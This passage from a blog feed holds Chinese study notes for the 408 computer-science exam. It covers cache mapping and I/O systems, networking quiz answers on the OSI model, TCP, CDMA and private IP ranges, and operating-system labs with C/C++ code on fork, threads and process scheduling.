<li>低位交叉编址<ul>
<li>个体轮流编址，能够增加速度带宽</li>
</ul>
</li>
</ul>
</li>
<li><p>排队器优先级判断:</p>
<ul>
<li>严重影响CPU工作的请求源给予次高优先级</li>
<li>易发生代码丢失的请求源给予最高优先级</li>
</ul>
</li>
<li><p>cache-主存地址映射：</p>
<ul>
<li>直接映射</li>
<li>全相联映射</li>
<li>组相联映射</li>
</ul>
</li>
<li><p>替换策略：</p>
<ul>
<li>先进先出策略</li>
<li>近期最少使用算法</li>
<li>随机法</li>
</ul>
</li>
</ol>
<h2 id="第五章：输入输出系统"><a href="#第五章：输入输出系统" class="headerlink" title="第五章：输入输出系统"></a>第五章：输入输出系统</h2><ol>
<li><p>输入输出系统发展的4个阶段：</p>
<ol>
<li>早期阶段 </li>
<li>接口模块和DMA阶段</li>
<li>具有通道结构的阶段</li>
<li>具有I&#x2F;O处理机的阶段</li>
</ol>
</li>
<li><p>I&#x2F;O设备与主机设备交换信息时，控制方式有：</p>
<ol>
<li>程序查询方式</li>
<li>程序中断方式</li>
<li>直接存储器存取 方式</li>
<li>I&#x2F;O通道方式 </li>
<li>I&#x2F;O处理机方式</li>
</ol>
</li>
<li><p>I&#x2F;O 设备的分类 ：</p>
<ol>
<li>人机交互设备 </li>
<li>计算机的信息 存储设备</li>
<li>机-——机通信设备</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>408</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络</title>
    <url>/2024/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<p>1、在OSI参考模型中，控制两个对等实体进行逻辑通信的规则的集合称为（协议  ）。</p>
<blockquote>
<p>在OSI参考模型中，控制两个对等实体进行逻辑通信的规则的集合称为<strong>协议</strong>。以下是关于OSI参考模型中协议及其作用的详细解释：</p>
<ol>
<li><p><strong>协议的定义</strong>：协议是控制两个对等实体进行逻辑通信的规则的集合。这些规则包括通信的内容、通信的方式等，确保数据在OSI参考模型的各层之间能够正确、可靠地传输。</p>
</li>
<li><p>协议的作用</p>
<p>：</p>
<ul>
<li><strong>确保通信的可靠性</strong>：通过定义明确的通信规则，协议能够确保数据在传输过程中不被损坏或丢失。</li>
<li><strong>实现数据的正确传输</strong>：协议规定了数据的格式、编码方式等，确保发送方和接收方能够正确地解析和传输数据。</li>
<li><strong>支持不同系统之间的互操作性</strong>：由于OSI参考模型是一个开放的标准，不同的计算机系统可以通过遵循相同的协议来实现互操作和数据交换。</li>
</ul>
</li>
<li><p><strong>OSI参考模型与协议</strong>：OSI参考模型将网络系统划分为七层，每一层都定义了相应的协议和功能。例如，物理层定义了电气和物理连接特性；数据链路层定义了帧的传输和差错控制；网络层负责路由选择和分组转发；传输层提供端到端的可靠传输服务等。这些协议共同构成了OSI参考模型的基础，支持着网络系统的正常运行。</p>
</li>
</ol>
<p>综上所述，在OSI参考模型中，控制两个对等实体进行逻辑通信的规则的集合称为协议。这些协议确保了数据在OSI参考模型的各层之间能够正确、可靠地传输，支持着网络系统的正常运行。</p>
</blockquote>
<p>2、在OSI参考模型中，第n层与它之上的第n+1层的关系是（ 第n层为第n+1层提供服务）。</p>
<p>A、第n层为第n+1层提供服务</p>
<p>B、第n+1层为从第n层接收的报文添加一个报头</p>
<p>C、第n层使用第n+1层提供的服务</p>
<p>D、第n层和第n+1层相互没有影响</p>
<hr>
<p>3、在OSI参考模型中，对等实体是指（收发双方相同层次中的实体 ）。</p>
<blockquote>
<p>在OSI参考模型中，对等实体（Peer Entity）是指<strong>位于不同机器上，但处于同一层次，完成相同功能的实体</strong>。具体来说：</p>
<ol>
<li><strong>实体（Entity）</strong>：在OSI参考模型中，每一层中用于实现该层功能的活动元素被称为实体。实体可以是软件实体（如一个进程、电子邮件系统、应用程序等）也可以是硬件实体（如终端、智能输入&#x2F;输出芯片等）。软件实体可以嵌入在本地操作系统中，或者用户应用程序中。</li>
<li><strong>对等层（Peer Layer）</strong>：不同机器上位于同一层次、完成相同功能的层被称为对等层。例如，主机A的应用层和主机B的应用层互为对等层，主机A的会话层和主机B的会话层也互为对等层。</li>
<li><strong>对等实体</strong>：当两个不同机器上的实体处于同一层次，且完成相同的功能时，这两个实体就被称为对等实体。例如，主机A和主机B传输层中的传输实体互为对等实体。</li>
</ol>
<p>综上所述，对等实体是OSI参考模型中位于不同机器上，但处于同一层次、完成相同功能的实体。这种结构有助于实现网络系统中不同机器之间的有效通信和协作。</p>
</blockquote>
<hr>
<p>4、TCP通信双方在基于TCP连接进行通信之前，首先要通过“三报文握手”来建立TCP连接，这属于网络协议三要素中的（ ）。</p>
<blockquote>
<p>TCP通信双方在基于TCP连接进行通信之前，首先要通过“三报文握手”来建立TCP连接，这属于网络协议三要素中的<strong>时序</strong>。</p>
<p>网络协议的三要素包括：</p>
<ol>
<li><p><strong>语义</strong>：解释控制信息每个部分的意义。它规定了需要发出何种控制信息，以及完成的动作与做出什么样的响应。在TCP三次握手中，语义规定了通信双方需要发出和响应的控制信息，如SYN（同步序列编号）和ACK（确认）等。</p>
</li>
<li><p><strong>语法</strong>：用户数据与控制信息的结构与格式，以及数据出现的顺序。在TCP协议中，语法定义了数据包（如SYN包、SYN-ACK包和ACK包）的格式和结构。</p>
</li>
<li><p>时序</p>
<p>：对事件发生顺序的详细说明（也可称为“同步”）。在TCP三次握手中，时序定义了建立连接时事件的顺序，包括：</p>
<ul>
<li>客户端发送带有SYN标志的数据包（第一次握手）。</li>
<li>服务端收到后发送带有SYN和ACK标志的数据包（第二次握手）。</li>
<li>客户端再发送带有ACK标志的数据包以确认连接（第三次握手）。</li>
</ul>
</li>
</ol>
</blockquote>
<hr>
<p>5、在数据从源主机传送至目的主机的过程中，不参与数据封装工作的是（物理层 ）。</p>
<blockquote>
<p>在数据从源主机传送至目的主机的过程中，不参与数据封装工作的是<strong>物理层</strong>。</p>
<p>数据封装是一个从源主机开始，逐层向下封装数据的过程，每一层都会在其数据上添加该层对应的头部信息（或尾部信息），形成该层的协议数据单元（PDU）。具体来说，这个过程包括：</p>
<ol>
<li><strong>应用层</strong>：该层负责处理网络应用程序之间的通信，可能会使用到各种应用协议，如HTTP、FTP等。在这一层，数据通常会被封装成应用层PDU，即应用层报文。</li>
<li><strong>表示层</strong>：该层的功能包括数据解密与加密、压缩、格式转换等，但并不直接参与数据封装工作。</li>
<li><strong>传输层</strong>：该层负责为源主机和目的主机之间的进程提供端到端的通信服务。在这一层，数据会被封装成传输层PDU，即数据段（TCP）或数据报（UDP）。</li>
<li><strong>网络层</strong>：该层负责处理分组在多个网络上的传输（路由）。在这一层，数据会被封装成网络层PDU，即IP数据报。</li>
<li><strong>数据链路层</strong>：该层负责在相邻节点之间无差错地传送数据帧。在这一层，网络层传下来的IP数据报会被封装成数据帧。</li>
</ol>
<p>而<strong>物理层</strong>主要解决的是使用何种信号在连接在各种计算机的各种传输介质上传输比特流的问题，从而屏蔽物理差异。它并不直接参与数据的封装工作，而是为数据在传输介质上的传输提供物理通道和接口。</p>
<p>因此，不参与数据封装工作的是物理层。</p>
</blockquote>
<hr>
<p>6、假设有500B的数据待发送（无拆分），需要经过OSI参考模型的逐层封装，除物理层外，其他各层在封装PDU时均引入20B的额外开销，则数据传输效率约为（81%  ）</p>
<blockquote>
<p>假设有500B（字节）的数据待发送（无拆分），并且需要经过OSI参考模型的逐层封装，除物理层外，其他各层在封装PDU（协议数据单元）时均引入20B的额外开销。我们可以按照以下步骤来计算数据传输效率：</p>
<ol>
<li>确定每层引入的额外开销<ul>
<li>除物理层外，每层引入20B的额外开销。</li>
<li>OSI参考模型共有7层，但物理层不引入额外开销，所以实际引入额外开销的层数为6层。</li>
</ul>
</li>
<li>计算总额外开销<ul>
<li>6层 × 20B&#x2F;层 &#x3D; 120B</li>
</ul>
</li>
<li>计算总发送数据量<ul>
<li>原始数据量 + 总额外开销 &#x3D; 500B + 120B &#x3D; 620B</li>
</ul>
</li>
<li>计算数据传输效率<ul>
<li>数据传输效率 &#x3D; 原始数据量 &#x2F; 总发送数据量</li>
<li>数据传输效率 &#x3D; 500B &#x2F; 620B ≈ 0.8065（或约80.65%）</li>
</ul>
</li>
</ol>
<p>综上所述，数据传输效率约为80.65%。这意味着大约80.65%的数据量是由实际的应用层数据组成的，而剩下的部分则是由于OSI参考模型中各层在封装过程中引入的额外开销。</p>
</blockquote>
<hr>
<p>7.将物理信道的总频带分割成若干子信道，每个子信道传输一路信号，这种信道复用技术是（ ）。</p>
<blockquote>
<p>将物理信道的总频带分割成若干子信道，每个子信道传输一路信号，这种信道复用技术称为<strong>频分复用（FDM，Frequency Division Multiplexing）</strong>。</p>
<p>频分复用技术的具体特点包括：</p>
<ol>
<li>原理：将用于传输信道的总带宽划分成若干个子频带（或称子信道），每一个子信道传输1路信号。</li>
<li>约束条件：<ul>
<li>所有子信道的带宽和不能超过信道的总带宽。</li>
<li>为了防止子信道之间相互干扰，相邻的子信道之间应该插入“保护频带”。</li>
</ul>
</li>
<li>优点：<ul>
<li>实现简单，充分利用了传输介质的带宽，系统效率较高。</li>
<li>频分复用技术的特点是所有子信道传输的信号以并行的方式工作，每一路信号传输时可不考虑传输时延。</li>
</ul>
</li>
</ol>
</blockquote>
<hr>
<p>8、A、B、C三个站点采用CDMA技术进行通信，A、B要向C发送数据，设A的码片序列为+1，-1，-1，+1，+1，+1，+1，-1。则B可以选用的码片序列为（  ）。</p>
<blockquote>
<p>-1，+1，-1，+1，-1，+1，+1，+1</p>
<p>(−1×+1)+(+1×−1)+(−1×−1)+(+1×+1)+(−1×+1)+(+1×+1)+(+1×+1)+(−1×−1)</p>
<p>&#x3D;−1−1+1+1−1+1+1+1</p>
<p>&#x3D;0</p>
</blockquote>
<hr>
<p>9、下列网络连接设备工作在数据链路层的是（ 交换机）。</p>
<blockquote>
<p>在网络中，设备根据其工作的OSI（Open Systems Interconnection）模型层次来分类。数据链路层（Data Link Layer）是OSI模型中的第二层，主要负责在相邻的两个网络节点间无差错的传送数据帧，并进行流量控制。</p>
<p>现在，我们分析下列常见的网络连接设备，以确定哪些设备工作在数据链路层：</p>
<ol>
<li><strong>路由器（Router）</strong>：路由器工作在网络层，主要负责路由选择和转发数据包。</li>
<li><strong>交换机（Switch）</strong>：交换机工作在数据链路层，主要负责数据的转发和过滤。交换机通过识别数据帧中的MAC地址来决定将数据转发到哪个端口。</li>
<li><strong>集线器（Hub）</strong>：集线器工作在物理层，主要用于将多个网络设备连接在一起，起到信号放大和重生的作用。</li>
<li><strong>网关（Gateway）</strong>：网关可以是任何设备或软件，它负责在不同协议或网络之间转换数据。通常，网关工作在网络层以上，但在具体实现中可能涉及多个层次。</li>
<li><strong>网桥（Bridge）</strong>：网桥工作在数据链路层，用于连接两个或多个局域网（LAN）。网桥通过识别数据帧中的MAC地址来决定是否转发数据。</li>
</ol>
</blockquote>
<hr>
<p>10、下列不能隔离碰撞域的设备是(集线器)</p>
<p>A、网桥</p>
<p>B、集线器</p>
<p>C、交换机</p>
<p>D、路由器</p>
<blockquote>
<p>A、网桥（Bridge） - 网桥工作在数据链路层，能够隔离碰撞域。它可以根据数据帧中的MAC地址来转发数据，确保数据只在需要的链路上传输，从而减少了碰撞的可能性。</p>
<p>B、集线器（Hub） - 集线器工作在物理层，采用广播方式传输数据。当集线器连接的任何一台设备发送数据时，所有数据都会被发送到集线器的每一个端口，这意味着所有的设备都处于同一个碰撞域中。</p>
<p>C、交换机（Switch） - 交换机同样工作在数据链路层，但它能够识别每个端口的MAC地址，并根据这些信息智能地转发数据。因此，交换机能够隔离碰撞域，确保每个端口下的设备都处于独立的碰撞域中。</p>
<p>D、路由器（Router） - 路由器工作在网络层，它可以根据IP地址来转发数据包。由于路由器连接的是不同的网络段，因此它天然地隔离了碰撞域。此外，路由器还可以隔离广播域。</p>
</blockquote>
<hr>
<p>11、10台用户主机通过一台交换机连接成10Mb&#x2F;s的交换式以太网，每个用户能够占有的带宽是（ 10Mb&#x2F;s）。</p>
<blockquote>
<p>在交换式以太网中，每个用户主机通过交换机连接时，都能获得独立的、与交换机接口速率相等的带宽。这是因为交换机工作在数据链路层，能够识别每个用户主机发送的数据帧中的源MAC地址和目的MAC地址，并根据这些信息将数据帧转发到目标用户主机。</p>
<p>在本题中，有10台用户主机通过一台交换机连接成10Mb&#x2F;s的交换式以太网。由于交换机能够隔离碰撞域并为每个用户主机提供独立的带宽，因此每个用户主机能够占有的带宽就是交换机接口的速率，即10Mb&#x2F;s。</p>
<p>总结答案：每个用户能够占有的带宽是10Mb&#x2F;s。</p>
</blockquote>
<hr>
<p>12、通过集线器连接的一组主机（<strong>既是一个冲突域，又是一个广播域</strong> ）。通过交换机连接的一组主机（ <strong>组成一个广播域，但不是一个冲突域</strong>）。</p>
<p>A、组成一个冲突域，但不是一个广播域</p>
<p>B、组成一个广播域，但不是一个冲突域</p>
<p>C、既是一个冲突域，又是一个广播域</p>
<p>D、既不是冲突域，也不是广播域</p>
<blockquote>
<ol>
<li><strong>冲突域</strong>：集线器（Hub）是一种物理层设备，它采用广播方式发送数据。当集线器下连接的主机设备间传输数据时，数据包是以广播的方式进行传输的。因为集线器不能识别MAC地址和IP地址，所以同一时刻由集线器连接的网络中只能传输一组数据。如果有多台设备同时尝试发送数据，就会发生碰撞，导致数据需要重新发送。因此，通过集线器连接的所有主机都处于同一个冲突域中。</li>
<li><strong>广播域</strong>：广播域是指网络中所有能接收到同样广播消息的设备的集合。由于集线器无法识别MAC地址，它会将接收到的所有数据广播到所有连接的端口上。这意味着，当一台主机发送一个广播数据包时，所有通过集线器连接的主机都能接收到这个广播数据包。因此，通过集线器连接的所有主机也处于同一个广播域中。</li>
</ol>
</blockquote>
<hr>
<p>13、根据NAT协议，下列IP地址中不允许出现在因特网上的是（ ）。</p>
<p>A、192.172.56.23</p>
<p>B、172.15.34.128</p>
<p>C、192.168.32.17</p>
<p>D、172.128.56.65</p>
<blockquote>
<p>根据NAT协议，<u>不允许出现在因特网上的IP地址是私有IP地址。</u>私有IP地址是指在内部网络中使用的IP地址，这些地址不会在互联网上被分配，因此不能直接在互联网上使用。</p>
<blockquote>
<p><strong>RFC1918为私有网络预留出了三个IP地址块：</strong></p>
<ul>
<li>A类：10.0.0.0～10.255.255.255</li>
<li>B类：172.16.0.0～172.31.255.255</li>
<li>C类：192.168.0.0～192.168.255.255</li>
</ul>
</blockquote>
<p>对比上述私有IP地址范围，我们可以看出：</p>
<ul>
<li>A选项 192.172.56.23 不属于上述任何一个私有IP地址范围，因此它可以出现在因特网上。</li>
<li>B选项 172.15.34.128 虽然以172开头，但它的第二段数字是15，不在172.16.0.0～172.31.255.255的范围内，因此它也可以出现在因特网上。</li>
<li>C选项 192.168.32.17 属于C类私有IP地址范围192.168.0.0～192.168.255.255，因此它不允许出现在因特网上。</li>
<li>D选项 172.128.56.65 虽然以172开头，但它的第二段数字是128，同样不在172.16.0.0～172.31.255.255的范围内，因此它也可以出现在因特网上。</li>
</ul>
<p>综上所述，不允许出现在因特网上的IP地址是C选项 192.168.32.17。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title>进程与线程-操作系统</title>
    <url>/2024/10/26/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><blockquote>
<p>实验说明</p>
<p>Ø进程是资源分配单位，fork产生的进程只是对父进程所有资源的克隆；</p>
<p>Ø引入线程后，线程是运行单位，但仍共享父进程的资源。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//procssees.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> son_pid,daughter_pid;</span><br><span class="line">    <span class="type">int</span> count =<span class="number">1</span>;</span><br><span class="line">    son_pid =fork();</span><br><span class="line">    <span class="keyword">if</span> (son_pid == <span class="number">0</span>)&#123;</span><br><span class="line">        count ++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i am son, count =%d\n&quot;</span>,count);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        daughter_pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(daughter_pid == <span class="number">0</span> )&#123;</span><br><span class="line">            count ++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;i am daughter,count=%d\n&quot;</span>,count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            count ++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;i am father,count=%d\n&quot;</span>,count);</span><br><span class="line">            waitpid(son_pid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">            waitpid(daughter_pid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BF%9B%E7%A8%8B.png" alt="进程"></p>
<blockquote>
<p>为什么出现son、daughter、father三个进程顺序不一致情况？</p>
<blockquote>
<p>当使用如fork()这样的系统调用来创建进程时，新创建的进程（子进程）与父进程是并发执行的。这意味着操作系统可以自由地调度这些进程，使它们以任何顺序运行。每个进程都有自己的执行路径和生命周期，它们可能会因为等待I&#x2F;O操作、系统资源限制、其他进程的优先级等原因而被挂起或延迟执行。因此，在并发编程中，进程的执行顺序通常是不确定的。</p>
</blockquote>
<p>为什么每个进程的count变量都是2？</p>
<blockquote>
<p>当使用fork()创建新进程时，父进程的内存空间（包括全局变量和静态变量）会被复制到子进程中。这意味着子进程将拥有与父进程相同的变量副本，但这些副本是独立的，对其中一个进程的变量进行修改不会影响其他进程的变量（除非使用了某种形式的进程间通信或共享内存）。</p>
</blockquote>
</blockquote>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//thread.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">daugther</span><span class="params">(<span class="type">void</span> *num)</span>&#123;</span><br><span class="line">    <span class="type">int</span>* a =(<span class="type">int</span> *)num;</span><br><span class="line">    *a += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am a daughter,count=%d\n&quot;</span>,*a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">son</span><span class="params">(<span class="type">void</span> *num)</span>&#123;</span><br><span class="line">    <span class="type">int</span> *a = (<span class="type">int</span> *)num;</span><br><span class="line">    *a += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am son,count=%d\n&quot;</span>,*a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> son_tid,daugther_tid;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;son_tid,<span class="literal">NULL</span>,son,&amp;count);</span><br><span class="line">    pthread_create(&amp;daugther_tid,<span class="literal">NULL</span>,daugther,&amp;count);</span><br><span class="line"></span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am parent,count:=%d\n&quot;</span>,count);</span><br><span class="line">    pthread_join(son_tid,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(daugther_tid,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码结果：</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BA%BF%E7%A8%8B.png" alt="线程"></p>
<blockquote>
<p>count变量为什么不一样？</p>
<blockquote>
<p>在多线程编程中，如果多个线程同时访问和修改同一个共享变量（如count），而没有适当的同步机制来保护这个变量，那么就会出现竞态条件（race condition）。竞态条件会导致变量的值变得不可预测，因为不同的线程可能会在没有任何顺序保证的情况下交替地读取和写入这个变量。son线程和daugther线程都试图修改共享的count变量。同时，主线程也在修改这个变量。由于这三个线程之间没有使用锁、互斥量或其他同步机制来确保对count变量的访问是原子的,因此count变量的值可能会在多个线程之间变得不一致。</p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>进程调度-操作系统</title>
    <url>/2024/10/19/%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><blockquote>
<p><strong>实验目的</strong></p>
<p>进一步理解进程调度的过程</p>
<p>理解先来先服务FCFS、简单时间片轮转、动态优先级调度算法的基本原理</p>
<p><strong>实验内容</strong></p>
<p>编写一个C或C++代码，实现以上要求的算法（至少完成2个算法），每进行一次调度，打印一次运行进程、就绪队列，以及每个进程的PCB信息。</p>
<p>实现环境:windows 、Linux</p>
<p><strong>输入及输出</strong></p>
<p>程序开始时，输入进程的个数，每个进程的名称、到达时间、服务时间、初始优先级（值越大，优先级越高）</p>
<p>选择一个调度算法，开始运行；</p>
<p>每进行一次调度，显示当前正在运行的进程名称、就绪队列中的进程名称（按顺序），以及当前所有进程的信息。</p>
<p>每个进程用一个进程PCB来表示，一般包括进程名（10个字符）、到达时间、服务时间、已用时间、优先数、进程状态（运行、就绪、完成）</p>
<p>进程到达、服务、已用时间均为时间片</p>
<p><strong>FCFS 调度算法</strong>：按照进程到达时间，依次调度，每个进程结束后，调度下一个进程。</p>
<p><strong>时间片轮转算法</strong>：每个进程完成一个时间片后，放弃处理机，转到就绪队列队尾（不考虑优先级）</p>
<p><strong>动态优先级</strong>：每个进程完成一个时间片后，优先级减1，插入到就绪队列相关位置（队列头是优先级最高的进程），每次调度，选择优先级最高的队列运行。</p>
</blockquote>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//进程三种状态，这里增加一种，表示虽然输入，但是还没有到达进入系统时刻typedef enum ProcessState&#123;Executing, Ready, Finish, Unarrive&#125;STATE;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">process_pcb</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ID;		<span class="comment">//进程标识	</span></span><br><span class="line">	<span class="type">int</span> priority;	<span class="comment">//进程优先数，值越大，优先级越高	</span></span><br><span class="line">	<span class="type">int</span> arrive_time;	<span class="comment">//进程到达时间，以时间片为单位	</span></span><br><span class="line">	<span class="type">int</span> service_time;	<span class="comment">//进程需要总的服务时间	</span></span><br><span class="line">	<span class="type">int</span> start_time;	<span class="comment">//进程开始执行时间	</span></span><br><span class="line">	<span class="type">int</span> end_time;	<span class="comment">//进程结束时间	</span></span><br><span class="line">	<span class="type">int</span> all_time;	<span class="comment">//进程仍然需要运行时间	</span></span><br><span class="line">	<span class="type">int</span> cpu_time;	<span class="comment">//进程已占用cpu时间 	</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>* state;	<span class="comment">//进程状态</span></span><br><span class="line">&#125;PCB;</span><br><span class="line"><span class="comment">//用于打印进程三种状态</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* StateString[] = &#123; <span class="string">&quot;Executing&quot;</span>,<span class="string">&quot;Ready&quot;</span>,<span class="string">&quot;Finish&quot;</span>,<span class="string">&quot;--&quot;</span> &#125;;</span><br><span class="line"><span class="comment">//排序比较函数：按照进程到达时间升序排列</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp_arrive_time</span><span class="params">(<span class="type">const</span> PCB a, <span class="type">const</span> PCB b)</span></span>;</span><br><span class="line"><span class="comment">//排序比较函数：按照进程优先数降序排序</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp_priority</span><span class="params">(<span class="type">const</span> PCB a, <span class="type">const</span> PCB b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input_process</span><span class="params">()</span></span>; <span class="comment">//输入进程信息</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">select_policy</span><span class="params">()</span></span>; <span class="comment">//选择进程调度策略</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_all</span><span class="params">(<span class="type">int</span> current)</span></span>; <span class="comment">//打印所有进程信息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FCFS</span><span class="params">()</span></span>; <span class="comment">//先来先服务算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">round_robin</span><span class="params">()</span></span>; <span class="comment">//时间片轮转算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dynamic_prio</span><span class="params">()</span></span>; <span class="comment">//动态优先级算法</span></span><br><span class="line"></span><br><span class="line">PCB* running_process = <span class="literal">NULL</span>;<span class="comment">//当前运行任务</span></span><br><span class="line"><span class="comment">//进程到达队列，如进程还没到到达时间，则该进程仍然在到达队列中</span></span><br><span class="line">vector&lt;PCB&gt; arrive_queue;</span><br><span class="line">vector&lt;PCB&gt; ready_queue;<span class="comment">//就绪队列</span></span><br><span class="line">vector&lt;PCB&gt; finish_queue;<span class="comment">//完成队列</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;===================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;              操作系统进程调度模拟实验            \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;===================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">input_process</span>();</span><br><span class="line">	<span class="built_in">print_all</span>(<span class="number">-1</span>); <span class="comment">//打印进程的初始状态</span></span><br><span class="line">	<span class="type">int</span> policy = <span class="built_in">select_policy</span>();</span><br><span class="line">	<span class="keyword">switch</span> (policy)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="built_in">FCFS</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">round_robin</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="built_in">dynamic_prio</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="built_in">FCFS</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按进程到达时间升序排列，先到达的排在队首</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp_arrive_time</span><span class="params">(<span class="type">const</span> PCB a, <span class="type">const</span> PCB b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.arrive_time &lt; b.arrive_time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按进程优先级降序排列，优先级高的排在队首</span></span><br><span class="line"><span class="comment">//如优先级相同，先到的进程排在前面</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp_priority</span><span class="params">(<span class="type">const</span> PCB a, <span class="type">const</span> PCB b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (a.priority != b.priority) &#123;</span><br><span class="line">		<span class="keyword">return</span> a.priority &gt; 